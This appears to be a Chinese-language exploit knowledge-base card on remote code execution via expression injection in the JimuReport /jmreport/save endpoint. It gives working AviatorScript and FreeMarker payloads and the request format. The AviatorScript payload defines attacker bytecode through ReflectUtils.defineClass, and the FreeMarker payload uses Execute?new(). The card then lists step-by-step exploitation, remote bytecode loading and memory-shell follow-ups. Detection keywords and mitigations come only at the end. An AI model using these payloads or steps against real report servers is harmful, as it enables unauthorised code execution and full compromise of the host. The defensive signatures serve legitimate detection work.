---
id: web-java-component-jimureport-save-cell-expression-injection-rce
title: JimuReport /jmreport/save 报表单元格表达式注入：AviatorScript use 或 FreeMarker ?new Execute 执行任意代码
type: scenario
domain: web
path: web/java/component
technique: jimureport-save-cell-expression-injection
aliases:
- 积木报表 save 表达式注入
- jmreport/save RCE
- 报表单元格 AviatorScript
- 报表 Freemarker Execute
- JimuReport 保存接口注入
tags:
- java
- jimureport
- jeecgboot
- aviator
- freemarker
- expression-injection
- rce
- defineclass
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:34+08:00'
  notes: 已对照原文核对：POST /jmreport/save 单元格 rows.*.cells.*.text、AviatorScript =(use ...ReflectUtils.defineClass(...)) 与 FreeMarker <#assign ex='freemarker.template.utility.Execute'?new()> ${ex('calc')}、token=123 占位，与原文 JSON POC 一致。dedup top 候选 freemarker-jeecg-compute-aviator 为 likely_duplicate，但候选仅覆盖 queryFieldBySql/loadTableData 的 sql→jeecg.compute→Aviator，本卡为 /save 单元格 text 直接求值，入口与参数不同，理由成立。未验证点：未对真实 JimuReport 复现；原文未标注版本；frontmatter 无 sources/source_url。
---

## 一句话结论

JimuReport（JeecgBoot 报表模块）的 `POST /jmreport/save` 在保存报表时会对单元格 `text` 做服务端表达式/模板求值；AviatorScript 版本可用 `=(use ...ReflectUtils.defineClass(...))` 加载 Base64 字节码并实例化，FreeMarker 版本可用 `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("calc")}` 直接执行命令，从而在报表保存请求中完成 RCE。

## 原理

- 报表设计器把单元格内容以 JSON 保存到服务端，`rows.<行>.cells.<列>.text` 是单元格文本。保存/渲染链路会把以 `=` 开头的文本交给 AviatorScript 求值，或把含 `${...}`/`<#...>` 的文本交给 FreeMarker 渲染。
- AviatorScript 提供 `use` 语法导入 Java 类；`org.springframework.cglib.core.ReflectUtils.defineClass(name, bytes, classloader)` 可以把任意字节码定义为类，再 `newInstance()` 触发类初始化/构造逻辑，从而执行攻击者字节码。字节码可 Base64 内嵌，也可从远程 URL/本地文件读取。
- FreeMarker 的 `freemarker.template.utility.Execute` 是一个可直接执行系统命令的 TemplateModel；在未启用 SAFER_RESOLVER（或 resolver 配置不当）的版本中，`?new()` 可实例化它，`${ex("calc")}` 即命令执行。
- 不同 JimuReport 版本使用不同表达式引擎，同一 `/jmreport/save` 端点可能表现为 AviatorScript 注入或 FreeMarker 注入；POC 是否成功取决于版本、模板安全 resolver 与鉴权配置。
- POC 中的 `token=123` 只是查询参数占位，不代表接口一定未授权；实际可达性取决于目标版本的拦截器与 token 校验。

## 触发条件

- 目标集成 JimuReport/JeecgBoot 报表模块并暴露 `/jmreport/save`。
- 服务端对单元格 text 做 AviatorScript/FreeMarker 求值，且未禁用危险类/未启用安全 resolver。
- 攻击者可访问保存接口（部分环境无需有效登录态）。

## 利用步骤

1. 确认 `/jmreport/save` 可达，构造最小报表 JSON（`rows`、`cells`、`text` 等字段）。
2. AviatorScript 版本：在 `text` 中放入 `=(use ...)` 表达式，先执行 `Runtime.getRuntime().exec()` 或加载 Base64 字节码验证。
3. FreeMarker 版本：在 `text` 中放入 `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("calc")}`。
4. 观察命令回显/外带（DNS、HTTP）或进程行为；成功后可用 defineClass 注入内存马或远程加载二阶段。
5. 若 payload 长度受限，改用远程 URL 加载或用文件上传接口落地字节码后本地读取。

## PoC

AviatorScript 单元格片段（放在 `rows.<行>.cells.<列>.text`）：

```
=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('ClassName', Base64Utils.decodeFromString('yv66...'), ClassLoader.getSystemClassLoader());)
```

FreeMarker 单元格片段：

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("calc") } ${param.a}
```

请求为 `POST /jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123`，`Content-Type: application/json`，请求体包含完整报表结构。

## 变体与关联

- 远程类加载：AviatorScript 中用 `new java.net.URL('http://.../1.txt').openStream()` 读取字节码，减少 payload 长度。
- 本地落地：先用 `/jeecg-boot/sys/common/upload` 上传字节码，再用 `Files.readAllBytes(Paths.get('/tmp/11.txt'))` 读取加载；不知道绝对路径时可用 `FileWriter` 追加写文件。
- FreeMarker `ObjectConstructor` + SpEL + `ReflectUtils.defineClass` 是同一端点在未启用安全 resolver 时的另一条利用链。
- 关联：`/jmreport/queryFieldBySql`、`/jmreport/loadTableData` 的 FreeMarker/Aviator 注入；`/jmreport/testConnection` 的 JDBC 注入。

## 检测与防御

- 升级 JimuReport/JeecgBoot 到修复版本，限制 `/jmreport/save` 访问并强制鉴权。
- 禁止单元格表达式求值，或为 Aviator 配置白名单/沙箱，为 FreeMarker 启用 `SAFER_RESOLVER` 并移除 `?new`/`Execute`。
- 对请求体中的 `use `、`ReflectUtils`、`defineClass`、`freemarker.template.utility.Execute`、`?new(` 等特征做检测与告警。
- 报表服务与业务系统隔离，限制其出网与本地文件访问权限。
